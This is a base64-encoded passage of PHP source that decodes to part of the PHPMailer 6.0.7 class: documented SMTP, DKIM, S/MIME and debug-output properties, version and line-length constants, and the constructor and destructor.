hlIFNNVFAgSEVMTyBvZiB0aGUgbWVzc2FnZS4KICAgICAqIERlZmF1bHQgaXMgJEhvc3RuYW1lLiBJZiAkSG9zdG5hbWUgaXMgZW1wdHksIFBIUE1haWxlciBhdHRlbXB0cyB0byBmaW5kCiAgICAgKiBvbmUgd2l0aCB0aGUgc2FtZSBtZXRob2QgZGVzY3JpYmVkIGFib3ZlIGZvciAkSG9zdG5hbWUuCiAgICAgKgogICAgICogQHNlZSBQSFBNYWlsZXI6OiRIb3N0bmFtZQogICAgICoKICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkSGVsbyA9ICcnOwogICAgLyoqCiAgICAgKiBXaGF0IGtpbmQgb2YgZW5jcnlwdGlvbiB0byB1c2Ugb24gdGhlIFNNVFAgY29ubmVjdGlvbi4KICAgICAqIE9wdGlvbnM6ICcnLCAnc3NsJyBvciAndGxzJy4KICAgICAqCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJFNNVFBTZWN1cmUgPSAnJzsKICAgIC8qKgogICAgICogV2hldGhlciB0byBlbmFibGUgVExTIGVuY3J5cHRpb24gYXV0b21hdGljYWxseSBpZiBhIHNlcnZlciBzdXBwb3J0cyBpdCwKICAgICAqIGV2ZW4gaWYgYFNNVFBTZWN1cmVgIGlzIG5vdCBzZXQgdG8gJ3RscycuCiAgICAgKiBCZSBhd2FyZSB0aGF0IGluIFBIUCA+PSA1LjYgdGhpcyByZXF1aXJlcyB0aGF0IHRoZSBzZXJ2ZXIncyBjZXJ0aWZpY2F0ZXMgYXJlIHZhbGlkLgogICAgICoKICAgICAqIEB2YXIgYm9vbAogICAgICovCiAgICBwdWJsaWMgJFNNVFBBdXRvVExTID0gdHJ1ZTsKICAgIC8qKgogICAgICogV2hldGhlciB0byB1c2UgU01UUCBhdXRoZW50aWNhdGlvbi4KICAgICAqIFVzZXMgdGhlIFVzZXJuYW1lIGFuZCBQYXNzd29yZCBwcm9wZXJ0aWVzLgogICAgICoKICAgICAqIEBzZWUgUEhQTWFpbGVyOjokVXNlcm5hbWUKICAgICAqIEBzZWUgUEhQTWFpbGVyOjokUGFzc3dvcmQKICAgICAqCiAgICAgKiBAdmFyIGJvb2wKICAgICAqLwogICAgcHVibGljICRTTVRQQXV0aCA9IGZhbHNlOwogICAgLyoqCiAgICAgKiBPcHRpb25zIGFycmF5IHBhc3NlZCB0byBzdHJlYW1fY29udGV4dF9jcmVhdGUgd2hlbiBjb25uZWN0aW5nIHZpYSBTTVRQLgogICAgICoKICAgICAqIEB2YXIgYXJyYXkKICAgICAqLwogICAgcHVibGljICRTTVRQT3B0aW9ucyA9IFtdOwogICAgLyoqCiAgICAgKiBTTVRQIHVzZXJuYW1lLgogICAgICoKICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkVXNlcm5hbWUgPSAnJzsKICAgIC8qKgogICAgICogU01UUCBwYXNzd29yZC4KICAgICAqCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJFBhc3N3b3JkID0gJyc7CiAgICAvKioKICAgICAqIFNNVFAgYXV0aCB0eXBlLgogICAgICogT3B0aW9ucyBhcmUgQ1JBTS1NRDUsIExPR0lOLCBQTEFJTiwgWE9BVVRIMiwgYXR0ZW1wdGVkIGluIHRoYXQgb3JkZXIgaWYgbm90IHNwZWNpZmllZC4KICAgICAqCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJEF1dGhUeXBlID0gJyc7CiAgICAvKioKICAgICAqIEFuIGluc3RhbmNlIG9mIHRoZSBQSFBNYWlsZXIgT0F1dGggY2xhc3MuCiAgICAgKgogICAgICogQHZhciBPQXV0aAogICAgICovCiAgICBwcm90ZWN0ZWQgJG9hdXRoOwogICAgLyoqCiAgICAgKiBUaGUgU01UUCBzZXJ2ZXIgdGltZW91dCBpbiBzZWNvbmRzLgogICAgICogRGVmYXVsdCBvZiA1IG1pbnV0ZXMgKDMwMHNlYykgaXMgZnJvbSBSRkMyODIxIHNlY3Rpb24gNC41LjMuMi4KICAgICAqCiAgICAgKiBAdmFyIGludAogICAgICovCiAgICBwdWJsaWMgJFRpbWVvdXQgPSAzMDA7CiAgICAvKioKICAgICAqIENvbW1hIHNlcGFyYXRlZCBsaXN0IG9mIERTTiBub3RpZmljYXRpb25zCiAgICAgKiAnTkVWRVInIHVuZGVyIG5vIGNpcmN1bXN0YW5jZXMgYSBEU04gbXVzdCBiZSByZXR1cm5lZCB0byB0aGUgc2VuZGVyLgogICAgICogICAgICAgICBJZiB5b3UgdXNlIE5FVkVSIGFsbCBvdGhlciBub3RpZmljYXRpb25zIHdpbGwgYmUgaWdub3JlZC4KICAgICAqICdTVUNDRVNTJyB3aWxsIG5vdGlmeSB5b3Ugd2hlbiB5b3VyIG1haWwgaGFzIGFycml2ZWQgYXQgaXRzIGRlc3RpbmF0aW9uLgogICAgICogJ0ZBSUxVUkUnIHdpbGwgYXJyaXZlIGlmIGFuIGVycm9yIG9jY3VycmVkIGR1cmluZyBkZWxpdmVyeS4KICAgICAqICdERUxBWScgICB3aWxsIG5vdGlmeSB5b3UgaWYgdGhlcmUgaXMgYW4gdW51c3VhbCBkZWxheSBpbiBkZWxpdmVyeSwgYnV0IHRoZSBhY3R1YWwKICAgICAqICAgICAgICAgICBkZWxpdmVyeSdzIG91dGNvbWUgKHN1Y2Nlc3Mgb3IgZmFpbHVyZSkgaXMgbm90IHlldCBkZWNpZGVkLgogICAgICoKICAgICAqIEBzZWUgaHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzM0NjEgU2VlIHNlY3Rpb24gNC4xIGZvciBtb3JlIGluZm9ybWF0aW9uIGFib3V0IE5PVElGWQogICAgICovCiAgICBwdWJsaWMgJGRzbiA9ICcnOwogICAgLyoqCiAgICAgKiBTTVRQIGNsYXNzIGRlYnVnIG91dHB1dCBtb2RlLgogICAgICogRGVidWcgb3V0cHV0IGxldmVsLgogICAgICogT3B0aW9uczoKICAgICAqICogYDBgIE5vIG91dHB1dAogICAgICogKiBgMWAgQ29tbWFuZHMKICAgICAqICogYDJgIERhdGEgYW5kIGNvbW1hbmRzCiAgICAgKiAqIGAzYCBBcyAyIHBsdXMgY29ubmVjdGlvbiBzdGF0dXMKICAgICAqICogYDRgIExvdy1sZXZlbCBkYXRhIG91dHB1dC4KICAgICAqCiAgICAgKiBAc2VlIFNNVFA6OiRkb19kZWJ1ZwogICAgICoKICAgICAqIEB2YXIgaW50CiAgICAgKi8KICAgIHB1YmxpYyAkU01UUERlYnVnID0gMDsKICAgIC8qKgogICAgICogSG93IHRvIGhhbmRsZSBkZWJ1ZyBvdXRwdXQuCiAgICAgKiBPcHRpb25zOgogICAgICogKiBgZWNob2AgT3V0cHV0IHBsYWluLXRleHQgYXMtaXMsIGFwcHJvcHJpYXRlIGZvciBDTEkKICAgICAqICogYGh0bWxgIE91dHB1dCBlc2NhcGVkLCBsaW5lIGJyZWFrcyBjb252ZXJ0ZWQgdG8gYDxicj5gLCBhcHByb3ByaWF0ZSBmb3IgYnJvd3NlciBvdXRwdXQKICAgICAqICogYGVycm9yX2xvZ2AgT3V0cHV0IHRvIGVycm9yIGxvZyBhcyBjb25maWd1cmVkIGluIHBocC5pbmkKICAgICAqIEJ5IGRlZmF1bHQgUEhQTWFpbGVyIHdpbGwgdXNlIGBlY2hvYCBpZiBydW4gZnJvbSBhIGBjbGlgIG9yIGBjbGktc2VydmVyYCBTQVBJLCBgaHRtbGAgb3RoZXJ3aXNlLgogICAgICogQWx0ZXJuYXRpdmVseSwgeW91IGNhbiBwcm92aWRlIGEgY2FsbGFibGUgZXhwZWN0aW5nIHR3byBwYXJhbXM6IGEgbWVzc2FnZSBzdHJpbmcgYW5kIHRoZSBkZWJ1ZyBsZXZlbDoKICAgICAqCiAgICAgKiBgYGBwaHAKICAgICAqICRtYWlsLT5EZWJ1Z291dHB1dCA9IGZ1bmN0aW9uKCRzdHIsICRsZXZlbCkge2VjaG8gImRlYnVnIGxldmVsICRsZXZlbDsgbWVzc2FnZTogJHN0ciI7fTsKICAgICAqIGBgYAogICAgICoKICAgICAqIEFsdGVybmF0aXZlbHksIHlvdSBjYW4gcGFzcyBpbiBhbiBpbnN0YW5jZSBvZiBhIFBTUi0zIGNvbXBhdGlibGUgbG9nZ2VyLCB0aG91Z2ggb25seSBgZGVidWdgCiAgICAgKiBsZXZlbCBvdXRwdXQgaXMgdXNlZDoKICAgICAqCiAgICAgKiBgYGBwaHAKICAgICAqICRtYWlsLT5EZWJ1Z291dHB1dCA9IG5ldyBteVBzcjNMb2dnZXI7CiAgICAgKiBgYGAKICAgICAqCiAgICAgKiBAc2VlIFNNVFA6OiREZWJ1Z291dHB1dAogICAgICoKICAgICAqIEB2YXIgc3RyaW5nfGNhbGxhYmxlfFxQc3JcTG9nXExvZ2dlckludGVyZmFjZQogICAgICovCiAgICBwdWJsaWMgJERlYnVnb3V0cHV0ID0gJ2VjaG8nOwogICAgLyoqCiAgICAgKiBXaGV0aGVyIHRvIGtlZXAgU01UUCBjb25uZWN0aW9uIG9wZW4gYWZ0ZXIgZWFjaCBtZXNzYWdlLgogICAgICogSWYgdGhpcyBpcyBzZXQgdG8gdHJ1ZSB0aGVuIHRvIGNsb3NlIHRoZSBjb25uZWN0aW9uCiAgICAgKiByZXF1aXJlcyBhbiBleHBsaWNpdCBjYWxsIHRvIHNtdHBDbG9zZSgpLgogICAgICoKICAgICAqIEB2YXIgYm9vbAogICAgICovCiAgICBwdWJsaWMgJFNNVFBLZWVwQWxpdmUgPSBmYWxzZTsKICAgIC8qKgogICAgICogV2hldGhlciB0byBzcGxpdCBtdWx0aXBsZSB0byBhZGRyZXNzZXMgaW50byBtdWx0aXBsZSBtZXNzYWdlcwogICAgICogb3Igc2VuZCB0aGVtIGFsbCBpbiBvbmUgbWVzc2FnZS4KICAgICAqIE9ubHkgc3VwcG9ydGVkIGluIGBtYWlsYCBhbmQgYHNlbmRtYWlsYCB0cmFuc3BvcnRzLCBub3QgaW4gU01UUC4KICAgICAqCiAgICAgKiBAdmFyIGJvb2wKICAgICAqLwogICAgcHVibGljICRTaW5nbGVUbyA9IGZhbHNlOwogICAgLyoqCiAgICAgKiBTdG9yYWdlIGZvciBhZGRyZXNzZXMgd2hlbiBTaW5nbGVUbyBpcyBlbmFibGVkLgogICAgICoKICAgICAqIEB2YXIgYXJyYXkKICAgICAqLwogICAgcHJvdGVjdGVkICRTaW5nbGVUb0FycmF5ID0gW107CiAgICAvKioKICAgICAqIFdoZXRoZXIgdG8gZ2VuZXJhdGUgVkVSUCBhZGRyZXNzZXMgb24gc2VuZC4KICAgICAqIE9ubHkgYXBwbGljYWJsZSB3aGVuIHNlbmRpbmcgdmlhIFNNVFAuCiAgICAgKgogICAgICogQHNlZSBodHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9WYXJpYWJsZV9lbnZlbG9wZV9yZXR1cm5fcGF0aAogICAgICogQHNlZSBodHRwOi8vd3d3LnBvc3RmaXgub3JnL1ZFUlBfUkVBRE1FLmh0bWwgUG9zdGZpeCBWRVJQIGluZm8KICAgICAqCiAgICAgKiBAdmFyIGJvb2wKICAgICAqLwogICAgcHVibGljICRkb192ZXJwID0gZmFsc2U7CiAgICAvKioKICAgICAqIFdoZXRoZXIgdG8gYWxsb3cgc2VuZGluZyBtZXNzYWdlcyB3aXRoIGFuIGVtcHR5IGJvZHkuCiAgICAgKgogICAgICogQHZhciBib29sCiAgICAgKi8KICAgIHB1YmxpYyAkQWxsb3dFbXB0eSA9IGZhbHNlOwogICAgLyoqCiAgICAgKiBES0lNIHNlbGVjdG9yLgogICAgICoKICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkREtJTV9zZWxlY3RvciA9ICcnOwogICAgLyoqCiAgICAgKiBES0lNIElkZW50aXR5LgogICAgICogVXN1YWxseSB0aGUgZW1haWwgYWRkcmVzcyB1c2VkIGFzIHRoZSBzb3VyY2Ugb2YgdGhlIGVtYWlsLgogICAgICoKICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkREtJTV9pZGVudGl0eSA9ICcnOwogICAgLyoqCiAgICAgKiBES0lNIHBhc3NwaHJhc2UuCiAgICAgKiBVc2VkIGlmIHlvdXIga2V5IGlzIGVuY3J5cHRlZC4KICAgICAqCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJERLSU1fcGFzc3BocmFzZSA9ICcnOwogICAgLyoqCiAgICAgKiBES0lNIHNpZ25pbmcgZG9tYWluIG5hbWUuCiAgICAgKgogICAgICogQGV4YW1wbGUgJ2V4YW1wbGUuY29tJwogICAgICoKICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkREtJTV9kb21haW4gPSAnJzsKICAgIC8qKgogICAgICogREtJTSBDb3B5IGhlYWRlciBmaWVsZCB2YWx1ZXMgZm9yIGRpYWdub3N0aWMgdXNlLgogICAgICoKICAgICAqIEB2YXIgYm9vbAogICAgICovCiAgICBwdWJsaWMgJERLSU1fY29weUhlYWRlckZpZWxkcyA9IHRydWU7CiAgICAvKioKICAgICAqIERLSU0gRXh0cmEgc2lnbmluZyBoZWFkZXJzLgogICAgICoKICAgICAqIEBleGFtcGxlIFsnTGlzdC1VbnN1YnNjcmliZScsICdMaXN0LUhlbHAnXQogICAgICoKICAgICAqIEB2YXIgYXJyYXkKICAgICAqLwogICAgcHVibGljICRES0lNX2V4dHJhSGVhZGVycyA9IFtdOwogICAgLyoqCiAgICAgKiBES0lNIHByaXZhdGUga2V5IGZpbGUgcGF0aC4KICAgICAqCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJERLSU1fcHJpdmF0ZSA9ICcnOwogICAgLyoqCiAgICAgKiBES0lNIHByaXZhdGUga2V5IHN0cmluZy4KICAgICAqCiAgICAgKiBJZiBzZXQsIHRha2VzIHByZWNlZGVuY2Ugb3ZlciBgJERLSU1fcHJpdmF0ZWAuCiAgICAgKgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRES0lNX3ByaXZhdGVfc3RyaW5nID0gJyc7CiAgICAvKioKICAgICAqIENhbGxiYWNrIEFjdGlvbiBmdW5jdGlvbiBuYW1lLgogICAgICoKICAgICAqIFRoZSBmdW5jdGlvbiB0aGF0IGhhbmRsZXMgdGhlIHJlc3VsdCBvZiB0aGUgc2VuZCBlbWFpbCBhY3Rpb24uCiAgICAgKiBJdCBpcyBjYWxsZWQgb3V0IGJ5IHNlbmQoKSBmb3IgZWFjaCBlbWFpbCBzZW50LgogICAgICoKICAgICAqIFZhbHVlIGNhbiBiZSBhbnkgcGhwIGNhbGxhYmxlOiBodHRwOi8vd3d3LnBocC5uZXQvaXNfY2FsbGFibGUKICAgICAqCiAgICAgKiBQYXJhbWV0ZXJzOgogICAgICogICBib29sICRyZXN1bHQgICAgICAgIHJlc3VsdCBvZiB0aGUgc2VuZCBhY3Rpb24KICAgICAqICAgYXJyYXkgICAkdG8gICAgICAgICAgICBlbWFpbCBhZGRyZXNzZXMgb2YgdGhlIHJlY2lwaWVudHMKICAgICAqICAgYXJyYXkgICAkY2MgICAgICAgICAgICBjYyBlbWFpbCBhZGRyZXNzZXMKICAgICAqICAgYXJyYXkgICAkYmNjICAgICAgICAgICBiY2MgZW1haWwgYWRkcmVzc2VzCiAgICAgKiAgIHN0cmluZyAgJHN1YmplY3QgICAgICAgdGhlIHN1YmplY3QKICAgICAqICAgc3RyaW5nICAkYm9keSAgICAgICAgICB0aGUgZW1haWwgYm9keQogICAgICogICBzdHJpbmcgICRmcm9tICAgICAgICAgIGVtYWlsIGFkZHJlc3Mgb2Ygc2VuZGVyCiAgICAgKiAgIHN0cmluZyAgJGV4dHJhICAgICAgICAgZXh0cmEgaW5mb3JtYXRpb24gb2YgcG9zc2libGUgdXNlCiAgICAgKiAgICAgICAgICAgICAgICAgICAgICAgICAgInNtdHBfdHJhbnNhY3Rpb25faWQnID0+IGxhc3Qgc210cCB0cmFuc2FjdGlvbiBpZAogICAgICoKICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkYWN0aW9uX2Z1bmN0aW9uID0gJyc7CiAgICAvKioKICAgICAqIFdoYXQgdG8gcHV0IGluIHRoZSBYLU1haWxlciBoZWFkZXIuCiAgICAgKiBPcHRpb25zOiBBbiBlbXB0eSBzdHJpbmcgZm9yIFBIUE1haWxlciBkZWZhdWx0LCB3aGl0ZXNwYWNlIGZvciBub25lLCBvciBhIHN0cmluZyB0byB1c2UuCiAgICAgKgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRYTWFpbGVyID0gJyc7CiAgICAvKioKICAgICAqIFdoaWNoIHZhbGlkYXRvciB0byB1c2UgYnkgZGVmYXVsdCB3aGVuIHZhbGlkYXRpbmcgZW1haWwgYWRkcmVzc2VzLgogICAgICogTWF5IGJlIGEgY2FsbGFibGUgdG8gaW5qZWN0IHlvdXIgb3duIHZhbGlkYXRvciwgYnV0IHRoZXJlIGFyZSBzZXZlcmFsIGJ1aWx0LWluIHZhbGlkYXRvcnMuCiAgICAgKiBUaGUgZGVmYXVsdCB2YWxpZGF0b3IgdXNlcyBQSFAncyBGSUxURVJfVkFMSURBVEVfRU1BSUwgZmlsdGVyX3ZhciBvcHRpb24uCiAgICAgKgogICAgICogQHNlZSBQSFBNYWlsZXI6OnZhbGlkYXRlQWRkcmVzcygpCiAgICAgKgogICAgICogQHZhciBzdHJpbmd8Y2FsbGFibGUKICAgICAqLwogICAgcHVibGljIHN0YXRpYyAkdmFsaWRhdG9yID0gJ3BocCc7CiAgICAvKioKICAgICAqIEFuIGluc3RhbmNlIG9mIHRoZSBTTVRQIHNlbmRlciBjbGFzcy4KICAgICAqCiAgICAgKiBAdmFyIFNNVFAKICAgICAqLwogICAgcHJvdGVjdGVkICRzbXRwOwogICAgLyoqCiAgICAgKiBUaGUgYXJyYXkgb2YgJ3RvJyBuYW1lcyBhbmQgYWRkcmVzc2VzLgogICAgICoKICAgICAqIEB2YXIgYXJyYXkKICAgICAqLwogICAgcHJvdGVjdGVkICR0byA9IFtdOwogICAgLyoqCiAgICAgKiBUaGUgYXJyYXkgb2YgJ2NjJyBuYW1lcyBhbmQgYWRkcmVzc2VzLgogICAgICoKICAgICAqIEB2YXIgYXJyYXkKICAgICAqLwogICAgcHJvdGVjdGVkICRjYyA9IFtdOwogICAgLyoqCiAgICAgKiBUaGUgYXJyYXkgb2YgJ2JjYycgbmFtZXMgYW5kIGFkZHJlc3Nlcy4KICAgICAqCiAgICAgKiBAdmFyIGFycmF5CiAgICAgKi8KICAgIHByb3RlY3RlZCAkYmNjID0gW107CiAgICAvKioKICAgICAqIFRoZSBhcnJheSBvZiByZXBseS10byBuYW1lcyBhbmQgYWRkcmVzc2VzLgogICAgICoKICAgICAqIEB2YXIgYXJyYXkKICAgICAqLwogICAgcHJvdGVjdGVkICRSZXBseVRvID0gW107CiAgICAvKioKICAgICAqIEFuIGFycmF5IG9mIGFsbCBraW5kcyBvZiBhZGRyZXNzZXMuCiAgICAgKiBJbmNsdWRlcyBhbGwgb2YgJHRvLCAkY2MsICRiY2MuCiAgICAgKgogICAgICogQHNlZSBQSFBNYWlsZXI6OiR0bwogICAgICogQHNlZSBQSFBNYWlsZXI6OiRjYwogICAgICogQHNlZSBQSFBNYWlsZXI6OiRiY2MKICAgICAqCiAgICAgKiBAdmFyIGFycmF5CiAgICAgKi8KICAgIHByb3RlY3RlZCAkYWxsX3JlY2lwaWVudHMgPSBbXTsKICAgIC8qKgogICAgICogQW4gYXJyYXkgb2YgbmFtZXMgYW5kIGFkZHJlc3NlcyBxdWV1ZWQgZm9yIHZhbGlkYXRpb24uCiAgICAgKiBJbiBzZW5kKCksIHZhbGlkIGFuZCBub24gZHVwbGljYXRlIGVudHJpZXMgYXJlIG1vdmVkIHRvICRhbGxfcmVjaXBpZW50cwogICAgICogYW5kIG9uZSBvZiAkdG8sICRjYywgb3IgJGJjYy4KICAgICAqIFRoaXMgYXJyYXkgaXMgdXNlZCBvbmx5IGZvciBhZGRyZXNzZXMgd2l0aCBJRE4uCiAgICAgKgogICAgICogQHNlZSBQSFBNYWlsZXI6OiR0bwogICAgICogQHNlZSBQSFBNYWlsZXI6OiRjYwogICAgICogQHNlZSBQSFBNYWlsZXI6OiRiY2MKICAgICAqIEBzZWUgUEhQTWFpbGVyOjokYWxsX3JlY2lwaWVudHMKICAgICAqCiAgICAgKiBAdmFyIGFycmF5CiAgICAgKi8KICAgIHByb3RlY3RlZCAkUmVjaXBpZW50c1F1ZXVlID0gW107CiAgICAvKioKICAgICAqIEFuIGFycmF5IG9mIHJlcGx5LXRvIG5hbWVzIGFuZCBhZGRyZXNzZXMgcXVldWVkIGZvciB2YWxpZGF0aW9uLgogICAgICogSW4gc2VuZCgpLCB2YWxpZCBhbmQgbm9uIGR1cGxpY2F0ZSBlbnRyaWVzIGFyZSBtb3ZlZCB0byAkUmVwbHlUby4KICAgICAqIFRoaXMgYXJyYXkgaXMgdXNlZCBvbmx5IGZvciBhZGRyZXNzZXMgd2l0aCBJRE4uCiAgICAgKgogICAgICogQHNlZSBQSFBNYWlsZXI6OiRSZXBseVRvCiAgICAgKgogICAgICogQHZhciBhcnJheQogICAgICovCiAgICBwcm90ZWN0ZWQgJFJlcGx5VG9RdWV1ZSA9IFtdOwogICAgLyoqCiAgICAgKiBUaGUgYXJyYXkgb2YgYXR0YWNobWVudHMuCiAgICAgKgogICAgICogQHZhciBhcnJheQogICAgICovCiAgICBwcm90ZWN0ZWQgJGF0dGFjaG1lbnQgPSBbXTsKICAgIC8qKgogICAgICogVGhlIGFycmF5IG9mIGN1c3RvbSBoZWFkZXJzLgogICAgICoKICAgICAqIEB2YXIgYXJyYXkKICAgICAqLwogICAgcHJvdGVjdGVkICRDdXN0b21IZWFkZXIgPSBbXTsKICAgIC8qKgogICAgICogVGhlIG1vc3QgcmVjZW50IE1lc3NhZ2UtSUQgKGluY2x1ZGluZyBhbmd1bGFyIGJyYWNrZXRzKS4KICAgICAqCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwcm90ZWN0ZWQgJGxhc3RNZXNzYWdlSUQgPSAnJzsKICAgIC8qKgogICAgICogVGhlIG1lc3NhZ2UncyBNSU1FIHR5cGUuCiAgICAgKgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHJvdGVjdGVkICRtZXNzYWdlX3R5cGUgPSAnJzsKICAgIC8qKgogICAgICogVGhlIGFycmF5IG9mIE1JTUUgYm91bmRhcnkgc3RyaW5ncy4KICAgICAqCiAgICAgKiBAdmFyIGFycmF5CiAgICAgKi8KICAgIHByb3RlY3RlZCAkYm91bmRhcnkgPSBbXTsKICAgIC8qKgogICAgICogVGhlIGFycmF5IG9mIGF2YWlsYWJsZSBsYW5ndWFnZXMuCiAgICAgKgogICAgICogQHZhciBhcnJheQogICAgICovCiAgICBwcm90ZWN0ZWQgJGxhbmd1YWdlID0gW107CiAgICAvKioKICAgICAqIFRoZSBudW1iZXIgb2YgZXJyb3JzIGVuY291bnRlcmVkLgogICAgICoKICAgICAqIEB2YXIgaW50CiAgICAgKi8KICAgIHByb3RlY3RlZCAkZXJyb3JfY291bnQgPSAwOwogICAgLyoqCiAgICAgKiBUaGUgUy9NSU1FIGNlcnRpZmljYXRlIGZpbGUgcGF0aC4KICAgICAqCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwcm90ZWN0ZWQgJHNpZ25fY2VydF9maWxlID0gJyc7CiAgICAvKioKICAgICAqIFRoZSBTL01JTUUga2V5IGZpbGUgcGF0aC4KICAgICAqCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwcm90ZWN0ZWQgJHNpZ25fa2V5X2ZpbGUgPSAnJzsKICAgIC8qKgogICAgICogVGhlIG9wdGlvbmFsIFMvTUlNRSBleHRyYSBjZXJ0aWZpY2F0ZXMgKCJDQSBDaGFpbiIpIGZpbGUgcGF0aC4KICAgICAqCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwcm90ZWN0ZWQgJHNpZ25fZXh0cmFjZXJ0c19maWxlID0gJyc7CiAgICAvKioKICAgICAqIFRoZSBTL01JTUUgcGFzc3dvcmQgZm9yIHRoZSBrZXkuCiAgICAgKiBVc2VkIG9ubHkgaWYgdGhlIGtleSBpcyBlbmNyeXB0ZWQuCiAgICAgKgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHJvdGVjdGVkICRzaWduX2tleV9wYXNzID0gJyc7CiAgICAvKioKICAgICAqIFdoZXRoZXIgdG8gdGhyb3cgZXhjZXB0aW9ucyBmb3IgZXJyb3JzLgogICAgICoKICAgICAqIEB2YXIgYm9vbAogICAgICovCiAgICBwcm90ZWN0ZWQgJGV4Y2VwdGlvbnMgPSBmYWxzZTsKICAgIC8qKgogICAgICogVW5pcXVlIElEIHVzZWQgZm9yIG1lc3NhZ2UgSUQgYW5kIGJvdW5kYXJpZXMuCiAgICAgKgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHJvdGVjdGVkICR1bmlxdWVpZCA9ICcnOwogICAgLyoqCiAgICAgKiBUaGUgUEhQTWFpbGVyIFZlcnNpb24gbnVtYmVyLgogICAgICoKICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIGNvbnN0IFZFUlNJT04gPSAnNi4wLjcnOwogICAgLyoqCiAgICAgKiBFcnJvciBzZXZlcml0eTogbWVzc2FnZSBvbmx5LCBjb250aW51ZSBwcm9jZXNzaW5nLgogICAgICoKICAgICAqIEB2YXIgaW50CiAgICAgKi8KICAgIGNvbnN0IFNUT1BfTUVTU0FHRSA9IDA7CiAgICAvKioKICAgICAqIEVycm9yIHNldmVyaXR5OiBtZXNzYWdlLCBsaWtlbHkgb2sgdG8gY29udGludWUgcHJvY2Vzc2luZy4KICAgICAqCiAgICAgKiBAdmFyIGludAogICAgICovCiAgICBjb25zdCBTVE9QX0NPTlRJTlVFID0gMTsKICAgIC8qKgogICAgICogRXJyb3Igc2V2ZXJpdHk6IG1lc3NhZ2UsIHBsdXMgZnVsbCBzdG9wLCBjcml0aWNhbCBlcnJvciByZWFjaGVkLgogICAgICoKICAgICAqIEB2YXIgaW50CiAgICAgKi8KICAgIGNvbnN0IFNUT1BfQ1JJVElDQUwgPSAyOwogICAgLyoqCiAgICAgKiBTTVRQIFJGQyBzdGFuZGFyZCBsaW5lIGVuZGluZy4KICAgICAqCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwcm90ZWN0ZWQgc3RhdGljICRMRSA9ICJcclxuIjsKICAgIC8qKgogICAgICogVGhlIG1heGltdW0gbGluZSBsZW5ndGggYWxsb3dlZCBieSBSRkMgMjgyMiBzZWN0aW9uIDIuMS4xLgogICAgICoKICAgICAqIEB2YXIgaW50CiAgICAgKi8KICAgIGNvbnN0IE1BWF9MSU5FX0xFTkdUSCA9IDk5ODsKICAgIC8qKgogICAgICogVGhlIGxvd2VyIG1heGltdW0gbGluZSBsZW5ndGggYWxsb3dlZCBieSBSRkMgMjgyMiBzZWN0aW9uIDIuMS4xLgogICAgICogVGhpcyBsZW5ndGggZG9lcyBOT1QgaW5jbHVkZSB0aGUgbGluZSBicmVhawogICAgICogNzYgbWVhbnMgdGhhdCBsaW5lcyB3aWxsIGJlIDc3IG9yIDc4IGNoYXJzIGRlcGVuZGluZyBvbiB3aGV0aGVyCiAgICAgKiB0aGUgbGluZSBicmVhayBmb3JtYXQgaXMgTEYgb3IgQ1JMRjsgYm90aCBhcmUgdmFsaWQuCiAgICAgKgogICAgICogQHZhciBpbnQKICAgICAqLwogICAgY29uc3QgU1REX0xJTkVfTEVOR1RIID0gNzY7CiAgICAvKioKICAgICAqIENvbnN0cnVjdG9yLgogICAgICoKICAgICAqIEBwYXJhbSBib29sICRleGNlcHRpb25zIFNob3VsZCB3ZSB0aHJvdyBleHRlcm5hbCBleGNlcHRpb25zPwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoJGV4Y2VwdGlvbnMgPSBudWxsKQogICAgewogICAgICAgIGlmIChudWxsICE9PSAkZXhjZXB0aW9ucykgewogICAgICAgICAgICAkdGhpcy0+ZXhjZXB0aW9ucyA9IChib29sKSAkZXhjZXB0aW9uczsKICAgICAgICB9CiAgICAgICAgLy9QaWNrIGFuIGFwcHJvcHJpYXRlIGRlYnVnIG91dHB1dCBmb3JtYXQgYXV0b21hdGljYWxseQogICAgICAgICR0aGlzLT5EZWJ1Z291dHB1dCA9IChzdHJwb3MoUEhQX1NBUEksICdjbGknKSAhPT0gZmFsc2UgPyAnZWNobycgOiAnaHRtbCcpOwogICAgfQogICAgLyoqCiAgICAgKiBEZXN0cnVjdG9yLgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gX19kZXN0cnVjdCgpCiAgICB7CiAgICAgICAgLy9DbG9zZSBhbnkgb3BlbiBTTVRQIGNvbm5lY3Rpb24gbmljZWx5CiAgICAgICAgJHRoaXMtPnNtdHBDbG9zZSgpOwogICAgfQogICAgLyoqCiAgICAgKiBDYWxsIG1haWwoKSBpbiBhIHNhZmVfbW9kZS1hd2FyZSBmYXNoaW9uLgogICAgICogQWxzbywgdW5sZXNzIHNlbmRtYWlsX3BhdGggcG9pbnRzIHRvIHNlbmRtYWlsIChvciBzb21ldGhpbmcgdGhhdAogICAgICogY2xh